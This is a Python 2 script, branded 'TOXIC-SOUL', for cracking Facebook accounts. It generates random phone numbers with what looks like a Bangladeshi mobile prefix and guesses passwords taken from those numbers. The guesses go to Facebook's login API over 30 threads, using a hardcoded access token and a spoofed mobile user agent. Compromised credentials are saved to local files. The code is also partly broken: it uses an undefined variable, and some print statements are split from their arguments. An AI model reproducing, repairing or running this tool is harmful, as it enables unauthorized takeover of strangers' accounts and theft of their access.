#!/usr/bin/python2

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, mechanize
os.system('rm -rf .txt')

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


for n in range(9999):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 C')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
os.system('clear')
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [
 ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')

logo = os.system("python logo.py")
back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    os.system("python logo.py")
    action()


def action():
    global cpb
    global oks
    bch = "1"
    if bch == '':
        print
        action()
    elif bch == '1':
        os.system('clear')
        os.system("python logo.py")
        try:
            k = '+880170'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    
    else:
        print
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Please wait, process is running ...')

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            result = k + c + user
            digi7 = result[7:14]
            pass1 = digi7
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]~TOXIC-SOUL~\x1b[0m ' + k + user + ' || ' + pass1 + '\n' + '\n'
                okb = open('save/oktxsoul.txt', 'a')
                okb.write(k + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(k + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[ERROR]~TOXIC-SOUL~\x1b[0m ' + k + user + ' || ' + pass1 + '\x1b[1;93m                   [Open After Some Days]\x1b[0m \n'
                cps = open('save/cptxsoul.txt', 'a')
                cps.write(k + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(k + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print
    50 * '-'
    print
    print
    '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] CP File Has Been Saved : save/cptxsoul.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python toxicsoul.py')


if __name__ == '__main__':
    menu()
